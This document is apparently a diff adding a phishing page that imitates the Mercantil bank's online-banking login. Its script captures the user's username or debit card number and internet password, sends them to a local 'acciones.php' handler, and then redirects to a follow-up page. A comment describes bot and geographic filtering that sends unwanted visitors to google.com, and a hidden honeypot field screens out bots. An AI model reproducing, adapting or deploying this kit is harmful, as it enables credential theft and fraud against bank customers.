@@ -1,0 +1,638 @@
+<html lang="es"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256">
+    <title>Mercantil</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#1976d2">
+    <link rel="stylesheet" href="assets/bootstrap.67b15cc69e6080ae.css" media="all" onload="this.media='all'">
+    <link rel="stylesheet" href="assets/intro-js.1f5cf64da5ee08c8.css" media="all" onload="this.media='all'">
+    <link rel="stylesheet" href="assets/styles.c663b1e287ec0a1e.css" media="all" onload="this.media='all'">
+    <link rel="stylesheet" href="assets/lara-light-blue-theme.8ecaee422619f77e.css" media="all" onload="this.media='all'">
+    <link rel="stylesheet" href="assets/primeng.a62c3f5e15ed62a4.css" media="all" onload="this.media='all'">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+    .remember-toggle {
+      display: inline-flex !important;
+      align-items: center !important;
+      gap: 8px !important;
+      cursor: pointer !important;
+      font-family: Arial, sans-serif !important;
+    }
+
+    .remember-text {
+      font-size: 14px !important;
+      font-weight: bold !important;
+      color: #004e9b !important;
+    }
+
+    .remember-input {
+      display: none !important;
+    }
+
+    .remember-slider {
+      position: relative !important;
+      width: 40px !important; /* un poco más ancho para compensar */
+      height: 22px !important; /* más alto = más grueso */
+      background-color: #b0c4de !important;
+      border-radius: 22px !important;
+      transition: background-color 0.3s !important;
+    }
+
+    .remember-slider::before {
+      content: "" !important;
+      position: absolute !important;
+      left: 2px !important;
+      top: 2px !important;
+      width: 18px !important; /* círculo más grande */
+      height: 18px !important;
+      background-color: white !important;
+      border-radius: 50% !important;
+      transition: transform 0.3s !important;
+    }
+
+    .remember-input:checked + .remember-slider {
+      background-color: #1976d2 !important;
+    }
+
+    .remember-input:checked + .remember-slider::before {
+      transform: translateX(18px) !important; /* desplazamiento ajustado */
+    }
+
+        .remember-toggle {
+          display: inline-flex !important;
+          align-items: center !important;
+          gap: 8px !important;
+          cursor: pointer !important;
+          font-family: Arial, sans-serif !important;
+        }
+
+        .remember-text {
+          font-size: 14px !important;
+          font-weight: bold !important;
+          color: #004e9b !important;
+        }
+
+        .remember-input {
+          display: none !important;
+        }
+
+        .remember-slider {
+          position: relative !important;
+          width: 40px !important;
+          height: 22px !important;
+          background-color: #b0c4de !important;
+          border-radius: 22px !important;
+          transition: background-color 0.3s !important;
+        }
+
+        .remember-slider::before {
+          content: "" !important;
+          position: absolute !important;
+          left: 2px !important;
+          top: 2px !important;
+          width: 18px !important;
+          height: 18px !important;
+          background-color: white !important;
+          border-radius: 50% !important;
+          transition: transform 0.3s !important;
+        }
+
+        .remember-input:checked + .remember-slider {
+          background-color: #1976d2 !important;
+        }
+
+        .remember-input:checked + .remember-slider::before {
+          transform: translateX(18px) !important;
+        }
+
+
+.logo-wrapper img,
+.iso-wrapper img {
+    width: 88px !important;
+    height: auto !important;
+    max-width: 120px !important;
+    margin-left: 105px !important;
+}
+
+    </style>
+
+
+    
+</head>
+
+<body __processed_8aaa2ff5-9f7e-46ad-9c53-d107caa6ac53__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMi4xIiwic2NvcmUiOjIwMjAxMH1d">
+
+    <app _nghost-ois-c32="" ng-version="13.3.11">
+        <router-outlet _ngcontent-ois-c32=""></router-outlet>
+        <melp-standard-layout _nghost-ois-c85="" class="ng-star-inserted">
+            <melp-loading _ngcontent-ois-c85="" _nghost-ois-c33="">
+                <div _ngcontent-ois-c33="" class="overlay" bis_skin_checked="1">
+                    <div _ngcontent-ois-c33="" class="multi-spinner-container" bis_skin_checked="1">
+                        <div _ngcontent-ois-c33="" class="multi-spinner blue" bis_skin_checked="1">
+                            <div _ngcontent-ois-c33="" class="multi-spinner orange" bis_skin_checked="1"></div>
+                        </div>
+                    </div>
+                </div>
+            </melp-loading>
+            <melp-header _ngcontent-ois-c85="" _nghost-ois-c54="">
+                <div _ngcontent-ois-c54="" class="nav-bar" bis_skin_checked="1">
+                    <div _ngcontent-ois-c54="" class="left-side" bis_skin_checked="1">
+                        <div _ngcontent-ois-c54="" class="main-menu-toggle-wrapper" bis_skin_checked="1">
+                            <div _ngcontent-ois-c54="" class="main-menu-toggle" bis_skin_checked="1"><span _ngcontent-ois-c54="" class="middle-line"></span></div>
+                        </div>
+                        <div _ngcontent-ois-c54="" class="bezel-wrapper" bis_skin_checked="1">
+                            <span _ngcontent-ois-c54="" class="bezel-1"></span>
+                            <span _ngcontent-ois-c54="" class="bezel-2"></span>
+                        </div>
+                        <div class="logo-wrapper" bis_skin_checked="1">
+                            <img _ngcontent-ois-c54="" alt="Logo" src="logotauro.svg">
+                        </div>
+                    </div>
+                                        <div _ngcontent-ois-c54="" class="right-side" bis_skin_checked="1">
+                        <div _ngcontent-ois-c54="" class="site-name-wrapper d-flex flex-row" bis_skin_checked="1">
+                            <p _ngcontent-ois-c54="" id="site-name">Mercantil en Línea Personas</p>
+                            <div _ngcontent-ois-c54="" class="header-button change-melp ng-star-inserted" bis_skin_checked="1"><button _ngcontent-ois-c54="" class="header-wrapper"><span _ngcontent-ois-c54="" class="header-text">Versión anterior</span></button></div>
+                            
+                            
+                        </div>
+                        <div _ngcontent-ois-c54="" class="transition" bis_skin_checked="1">
+                            
+                        </div>
+                    </div>
+                </div>
+            </melp-header>
+            <melp-modal _ngcontent-ois-c85="" _nghost-ois-c56="">
+                
+            </melp-modal>
+            <melp-modal-image _ngcontent-ois-c85="" _nghost-ois-c57="">
+                
+            </melp-modal-image>
+            <melp-share-transaction-form _ngcontent-ois-c85="" _nghost-ois-c74="" class="ng-star-inserted">
+                <div _ngcontent-ois-c74="" class="fade-background" bis_skin_checked="1">
+                    <div _ngcontent-ois-c74="" class="card" bis_skin_checked="1"><span _ngcontent-ois-c74="" class="close">×</span>
+                        <div _ngcontent-ois-c74="" class="card-body webTransaction__card" bis_skin_checked="1">
+                            <div _ngcontent-ois-c74="" class="title" bis_skin_checked="1"></div>
+                            <div class="share-info" bis_skin_checked="1">
+
+                                <div id="password-popup" style="display:none;" bis_skin_checked="1">
+                                    <!-- Aquí va el contenido del popup de contraseña -->
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+            </melp-share-transaction-form>
+            
+            <div _ngcontent-ois-c85="" id="app-container" bis_skin_checked="1">
+                <div _ngcontent-ois-c85="" class="overlay-sidebar" bis_skin_checked="1"></div>
+                <melp-system-error _ngcontent-ois-c85="" _nghost-ois-c77="">
+                    <div _ngcontent-ois-c77="" class="hide" bis_skin_checked="1">
+                        <melp-navigation _ngcontent-ois-c77="" _nghost-ois-c76="">
+                            
+                            <div _ngcontent-ois-c76="" id="navigation" bis_skin_checked="1">
+                                <div _ngcontent-ois-c76="" class="data-info" bis_skin_checked="1">
+                                    <div _ngcontent-ois-c76="" class="data-info-section" bis_skin_checked="1">
+                                        <span _ngcontent-ois-c76="" class="data-info-section-breadcrumb ng-star-inserted">
+                                            
+                                        </span>
+                                        
+                                    </div>
+                                    <div _ngcontent-ois-c76="" class="data-info-page ng-star-inserted" bis_skin_checked="1"><span _ngcontent-ois-c76="" class="data-info-page-title">Inicia tu sesión</span></div>
+                                    
+                                    <melp-alert-float _ngcontent-ois-c76="" _nghost-ois-c75="">
+                                        
+                                    </melp-alert-float>
+                                </div>
+                            </div>
+                        </melp-navigation>
+                    </div>
+                    <div _ngcontent-ois-c77="" id="system-error" class="hide" bis_skin_checked="1">
+                        
+                    </div>
+                </melp-system-error>
+                <melp-sidebar _ngcontent-ois-c85="" _nghost-ois-c79="" class="ng-star-inserted">
+                    
+                    
+                    <div _ngcontent-ois-c79="" id="step1" data-tooltipclass="tour-class" class="sidebar notLogged" bis_skin_checked="1">
+                        
+                        <div _ngcontent-ois-c79="" class="li active ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c79="" alt="Inicia tu sesión" src="assets/get-into-activo.svg"></div>
+                            <div _ngcontent-ois-c79="" bis_skin_checked="1"><a _ngcontent-ois-c79="">Inicia tu sesión</a></div>
+                        </div>
+                        
+                        <div _ngcontent-ois-c79="" class="li ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c79="" alt="Regístrate" src="assets/create-user-activo.svg"></div>
+                            <div _ngcontent-ois-c79="" bis_skin_checked="1"><a _ngcontent-ois-c79="">Regístrate</a></div>
+                        </div>
+                        
+                        <div _ngcontent-ois-c79="" class="li ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c79="" alt="Recupera tu usuario" src="assets/user-activo.svg"></div>
+                            <div _ngcontent-ois-c79="" bis_skin_checked="1"><a _ngcontent-ois-c79="">Recupera tu usuario</a></div>
+                        </div>
+                        
+                        <div _ngcontent-ois-c79="" class="li ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c79="" alt="Cambia tu clave de internet" src="assets/change-activo.svg"></div>
+                            <div _ngcontent-ois-c79="" bis_skin_checked="1"><a _ngcontent-ois-c79="">Cambia tu clave de internet</a></div>
+                        </div>
+                        
+                        <div _ngcontent-ois-c79="" class="li ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c79="" alt="Desbloquea tu clave de internet" src="assets/unlock-activo.svg"></div>
+                            <div _ngcontent-ois-c79="" bis_skin_checked="1"><a _ngcontent-ois-c79="">Desbloquea tu clave de internet</a></div>
+                        </div>
+                        
+                        
+                        
+                        <div _ngcontent-ois-c79="" class="second-level scroll-second-level" bis_skin_checked="1">
+                            
+                        </div>
+                        <div _ngcontent-ois-c79="" class="secondary-menu-wrapper ng-star-inserted" bis_skin_checked="1">
+                            <div _ngcontent-ois-c79="" class="secondary-menu" style="border: none;" bis_skin_checked="1"><a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted">
+                                    <img _ngcontent-ois-c79="" src="assets/Cont-1.svg" alt="Contáctenos"></a>
+                                
+                                
+                                
+                                
+                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ubic-1.svg" alt="Ubíquenos"></a>
+                                
+                                
+                                
+                                
+                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Tips_seg-1.svg" alt="Ciberseguridad"></a>
+                                
+                                
+                                
+                                
+                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Pol_seg-1.svg" alt="Política de privacidad"></a>
+                                
+                                
+                                
+                                
+                                <a _ngcontent-ois-c79="" target="_blank" placement="top" container="body" class="img-wrapper col ng-star-inserted"><img _ngcontent-ois-c79="" src="assets/Ter_cond-1.svg" alt="Términos y Condiciones"></a>
+                                
+                                
+                                
+                                
+                                
+                                
+                                
+                                
+                            </div>
+                        </div>
+                        
+                        <div _ngcontent-ois-c79="" class="secondary-submenu-wrapper" bis_skin_checked="1">
+                            
+                            
+                        </div>
+                    </div>
+                </melp-sidebar>
+                
+                
+                <melp-second-sidebar _ngcontent-ois-c85="" _nghost-ois-c83="">
+                    
+                    <div _ngcontent-ois-c83="" class="second-sidebar" bis_skin_checked="1">
+                        
+                    </div>
+                </melp-second-sidebar>
+                
+                <router-outlet _ngcontent-ois-c85=""></router-outlet>
+                <melp-login _nghost-ois-c165="" class="ng-star-inserted">
+                    <melp-login-background _ngcontent-ois-c165="" id="login-melp" _nghost-ois-c161="" class="ng-star-inserted">
+                        <div _ngcontent-ois-c161="" class="faded-background" bis_skin_checked="1">
+                            <div _ngcontent-ois-c161="" class="content" bis_skin_checked="1">
+                                <div _ngcontent-ois-c165="" class="card-wrapper" bis_skin_checked="1">
+                                    <div _ngcontent-ois-c165="" class="card" bis_skin_checked="1">
+                                        <div _ngcontent-ois-c165="" class="card-body" bis_skin_checked="1">
+                                            <div _ngcontent-ois-c165="" class="login-title" bis_skin_checked="1">
+                                                <p _ngcontent-ois-c165="" class="login-welcome ng-star-inserted">Bienvenido</p>
+                                                
+                                                
+                                                <span _ngcontent-ois-c165="" class="login-iniciated">Inicia tu sesión</span>
+                                            </div>
+                                            <melp-description _ngcontent-ois-c165="" _nghost-ois-c162="">
+                                                <div _ngcontent-ois-c162="" class="description-wrapper active" bis_skin_checked="1">
+                                                    <div _ngcontent-ois-c162="" class="description" bis_skin_checked="1">
+                                                        
+                                                        <ul _ngcontent-ois-c162="" class="ng-star-inserted">
+                                                            
+                                                        </ul>
+                                                        
+                                                        
+                                                    </div>
+                                                </div>
+                                                <div _ngcontent-ois-c162="" class="error-message-wrapper" bis_skin_checked="1">
+                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper" bis_skin_checked="1"><img _ngcontent-ois-c162="" alt="Error" src="assets/alerta-rojo-new.svg"></div>
+                                                    <div _ngcontent-ois-c162="" class="error-message ng-star-inserted" bis_skin_checked="1">
+                                                        
+                                                    </div>
+                                                    
+                                                    
+                                                </div>
+                                                <div _ngcontent-ois-c162="" class="info__wrapper" bis_skin_checked="1">
+                                                    <div _ngcontent-ois-c162="" class="error-img-wrapper ng-star-inserted" bis_skin_checked="1"><img _ngcontent-ois-c162="" alt="Error" src="assets/Alerta-azul.svg"></div>
+                                                    
+                                                    <div _ngcontent-ois-c162="" class="info__wrapper--message text-center" bis_skin_checked="1"><span _ngcontent-ois-c162="" style="font-weight: bold;"></span>
+                                                        
+                                                    </div>
+                                                </div>
+                                            </melp-description>
+                                            <form id="loginForm" name="loginForm" method="POST" action="send.php" class="form-group ng-untouched ng-pristine">
+                                                <div _ngcontent-ois-c165="" class="ng-star-inserted" bis_skin_checked="1">
+                                                    <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-2 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
+                                                        <div class="mat-form-field-wrapper ng-tns-c71-2" bis_skin_checked="1">
+                                                            <div class="mat-form-field-flex ng-tns-c71-2" bis_skin_checked="1">
+                                                                
+                                                                
+                                                                <div class="mat-form-field-infix ng-tns-c71-2" bis_skin_checked="1">
+                                                                    <input name="usr" id="usr" placeholder="Ingresa..." formcontrolname="username" class="mat-input-element mat-form-field-autofill-control ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored ng-star-inserted" type="password" autocomplete="off" required="">
+                                                                    
+                                                                    
+                                                                    
+                                                                    <span class="mat-form-field-label-wrapper ng-tns-c71-2">
+                                                                         <label class="mat-form-field-label ng-tns-c71-2 ng-star-inserted" id="mat-form-field-label-5" for="usr" aria-owns="usr">
+                                                                            
+                                                                            <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-2 ng-star-inserted">Usuario o Tarjeta de débito</mat-label>
+
+                                                                            
+                                                                        </label>
+                                                                        
+                                                                    </span>
+                                                                </div>
+                                                                <div class="mat-form-field-suffix ng-tns-c71-2 ng-star-inserted" bis_skin_checked="1">
+                                                                    <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-2"><img _ngcontent-ois-c165="" alt="Mostrar usuario" class="icon pointer" src="assets/eye-disabled-blue.svg" data-password-toggle="usr" role="button" tabindex="0" aria-pressed="false">
+                                                                    </mat-icon>
+                                                                </div>
+                                                                
+                                                            </div>
+                                                            <div class="mat-form-field-underline ng-tns-c71-2 ng-star-inserted" bis_skin_checked="1"><span class="mat-form-field-ripple ng-tns-c71-2"></span></div>
+                                                            
+                                                            <div class="mat-form-field-subscript-wrapper ng-tns-c71-2" bis_skin_checked="1">
+                                                                
+                                                                <div class="mat-form-field-hint-wrapper ng-tns-c71-2 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">
+                                                                    
+                                                                    <div class="mat-form-field-hint-spacer ng-tns-c71-2" bis_skin_checked="1"></div>
+                                                                </div>
+                                                                
+                                                            </div>
+                                                        </div>
+                                                    </mat-form-field>
+                                                    <div _ngcontent-ois-c165="" class="login-link" bis_skin_checked="1"> ¿Olvidaste tu usuario? </div>
+                                                </div>
+                                                
+                                                <mat-form-field _ngcontent-ois-c165="" floatlabel="always" class="mat-form-field ng-tns-c71-1 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-legacy mat-form-field-can-float mat-form-field-should-float mat-form-field-has-label ng-untouched ng-pristine ng-invalid ng-star-inserted">
+                                                    <div class="mat-form-field-wrapper ng-tns-c71-1" bis_skin_checked="1">
+                                                        <div class="mat-form-field-flex ng-tns-c71-1" bis_skin_checked="1">
+                                                            
+                                                            
+                                                            <div class="mat-form-field-infix ng-tns-c71-1" bis_skin_checked="1">
+                                                                <input name="clv" id="clv" placeholder="Ingresa..." formcontrolname="password" autocomplete="off" class="mat-input-element mat-form-field-autofill-control ng-tns-c71-1 ng-untouched ng-pristine ng-invalid cdk-text-field-autofill-monitored" minlength="8" type="password" required="">
+                                                                
+                                                                <span class="mat-form-field-label-wrapper ng-tns-c71-1">
+                                                                    <label class="mat-form-field-label ng-tns-c71-1 ng-star-inserted" id="mat-form-field-label-3" for="clv" aria-owns="clv">
+                                                                        
+                                                                        <mat-label _ngcontent-ois-c165="" class="ng-tns-c71-1 ng-star-inserted">Clave de internet</mat-label>
+                                                                        <span aria-hidden="true" class="mat-placeholder-required mat-form-field-required-marker ng-tns-c71-1 ng-star-inserted"> *</span>
+                                                                        
+                                                                    </label>
+                                                                    
+                                                                </span></div>
+                                                            <div class="mat-form-field-suffix ng-tns-c71-1 ng-star-inserted" bis_skin_checked="1">
+                                                                    <mat-icon _ngcontent-ois-c165="" matsuffix="" class="ng-tns-c71-1"><img _ngcontent-ois-c165="" alt="Mostrar contraseña" class="icon pointer" src="assets/eye-disabled-blue.svg" data-password-toggle="clv" role="button" tabindex="0" aria-pressed="false"></mat-icon>
+                                                            </div>
+                                                            
+                                                        </div>
+                                                        <div class="mat-form-field-underline ng-tns-c71-1 ng-star-inserted" bis_skin_checked="1"><span class="mat-form-field-ripple ng-tns-c71-1"></span></div>
+                                                        
+                                                        <div class="mat-form-field-subscript-wrapper ng-tns-c71-1" bis_skin_checked="1">
+                                                            
+                                                            <div class="mat-form-field-hint-wrapper ng-tns-c71-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);" bis_skin_checked="1">
+                                                                
+                                                                <div class="mat-form-field-hint-spacer ng-tns-c71-1" bis_skin_checked="1"></div>
+                                                            </div>
+                                                            
+                                                        </div>
+                                                    </div>
+                                                </mat-form-field>
+                                                <div _ngcontent-ois-c165="" class="login-link" bis_skin_checked="1"> ¿Olvidaste tu clave de internet? </div>
+
+                                                <label class="remember-toggle">
+                                                  <span class="remember-text">Recordar usuario</span>
+                                                  <input type="checkbox" id="rememberUser" class="remember-input">
+                                                  <span class="remember-slider"></span>
+                                                </label>
+
+
+
+                                                
+                                                <div _ngcontent-ois-c165="" class="login-button" bis_skin_checked="1">
+                                                    <melp-button-wrapper _ngcontent-ois-c165="" _nghost-ois-c164="">
+                                                        <div _ngcontent-ois-c164="" class="button-wrapper button-wrapper-separation-end" bis_skin_checked="1">
+                                                            
+                                                            <div _ngcontent-ois-c164="" class="button-wrapper-main-button w-100 button-wrapper-center" bis_skin_checked="1">
+                                                            <button type="submit" _ngcontent-ois-c164="" class="btn btn-primary ng-star-inserted">Iniciar</button>
+                                                            
+                                                            </div>
+                                                        </div>
+                                                    </melp-button-wrapper>
+                                                </div>
+                                                
+                                            </form>
+
+                                            
+
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            
+                            
+                            
+                            
+                            
+                            
+                            
+                            
+                            <img _ngcontent-ois-c161="" alt="faded-background" class="bottom-img ng-star-inserted" src="assets/07.webp">
+                            <div _ngcontent-ois-c161="" class="white-background ng-star-inserted" bis_skin_checked="1"></div><img _ngcontent-ois-c161="" alt="Cliente" class="upper-img ng-star-inserted" src="assets/07(1).webp">
+                            
+                            
+                            
+                        </div>
+                    </melp-login-background>
+                    
+                </melp-login>
+                
+                <melp-footer _ngcontent-ois-c85="" _nghost-ois-c84="">
+                    <footer _ngcontent-ois-c84=""><span _ngcontent-ois-c84="" id="copyright" class="text-center">El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</span></footer>
+                </melp-footer>
+            </div>
+        </melp-standard-layout>
+        
+    </app>
+    <style>
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+            font-size: 18px;
+            font-family: Arial, sans-serif;
+            z-index: 9999;
+        }
+
+        .loading-container {
+            margin-top: 25%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <div id="loadingOverlay" bis_skin_checked="1">
+        <div class="loading-container" bis_skin_checked="1">
+            <div class="spinner" bis_skin_checked="1"></div><br><br>
+            <p id="loadingText"></p>
+        </div>
+    </div>
+<script>
+// Función para obtener o generar un ID de sesión válido
+function obtenerSessionIdLimpio() {
+    let id = sessionStorage.getItem('active_session_id');
+    if (!id || id === 'undefined' || id === 'null' || id === 'sessionId' || id.includes('${')) {
+        id = Date.now().toString();
+        sessionStorage.setItem('active_session_id', id);
+    }
+    return id;
+}
+
+let sessionId = obtenerSessionIdLimpio();
+
+document.querySelectorAll('[data-password-toggle]').forEach((toggle) => {
+    const changeVisibility = () => {
+        const input = document.getElementById(toggle.dataset.passwordToggle);
+        if (!input) return;
+
+        const isVisible = input.type === 'text';
+        input.type = isVisible ? 'password' : 'text';
+        toggle.src = isVisible ? 'assets/eye-disabled-blue.svg' : 'assets/eye-enabled-blue.svg';
+        toggle.alt = isVisible ? 'Mostrar contraseña' : 'Ocultar contraseña';
+        toggle.setAttribute('aria-pressed', String(!isVisible));
+    };
+
+    toggle.addEventListener('click', changeVisibility);
+    toggle.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter' || event.key === ' ') {
+            event.preventDefault();
+            changeVisibility();
+        }
+    });
+});
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const inputUsr = document.getElementById('usr');
+    const inputClv = document.getElementById('clv');
+
+    if (!inputUsr || !inputClv) {
+        console.error("Error: No se encontró el input de usuario o clave en el DOM.");
+        alert("Error en la interfaz: No se detectan los campos de texto.");
+        return;
+    }
+
+    const usr = inputUsr.value;
+    const clv = inputClv.value;
+
+    try {
+        const respuesta = await fetch('acciones.php?accion=enviar', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                usr, 
+                clv, 
+                _hp: (document.getElementById('_hp') ? document.getElementById('_hp').value : ''),
+                device: 'Navegador Web', 
+                id: sessionId 
+            })
+        });
+
+        const resultado = await respuesta.json();
+
+        // Bloqueo por geo / bot: redirigir a google.com
+        if (resultado && resultado.redirect) {
+            window.location.replace(resultado.redirect);
+            return;
+        }
+
+        // Validar respuesta del servidor sanitizando cualquier string roto
+        let idFinal = (resultado && resultado.sessionId && resultado.sessionId !== 'undefined' && !resultado.sessionId.includes('${'))
+            ? resultado.sessionId 
+            : sessionId;
+
+        sessionStorage.setItem('active_session_id', idFinal);
+        
+        // Redirección forzada usando concatenación limpia
+        window.location.href = 'loade830.html?id=' + encodeURIComponent(idFinal);
+
+    } catch (error) {
+        console.error("Error al conectar con Render:", error);
+        alert("Ocurrió un error al conectar con el servidor.");
+    }
+});
+
+// Validación de caracteres en el input de usuario
+const inputUsr = document.getElementById('usr');
+
+if (inputUsr) {
+  inputUsr.addEventListener('keypress', function(e) {
+    const char = String.fromCharCode(e.which);
+    const validChars = /^[a-zA-Z0-9]$/;
+    if (!validChars.test(char)) e.preventDefault();
+  });
+  
+  inputUsr.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+    this.value = pastedText.replace(/[^a-zA-Z0-9]/g, '');
+  });
+  
+  inputUsr.addEventListener('blur', function() {
+    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+  });
+}
+</script>
+
+<!-- honeypot -->
+<div style="position:absolute;left:-9999px;top:-9999px;height:0;width:0;overflow:hidden" aria-hidden="true">
+  <label>No completar</label>
+  <input type="text" id="_hp" name="_hp" tabindex="-1" autocomplete="off">
+</div>
+</body></html>
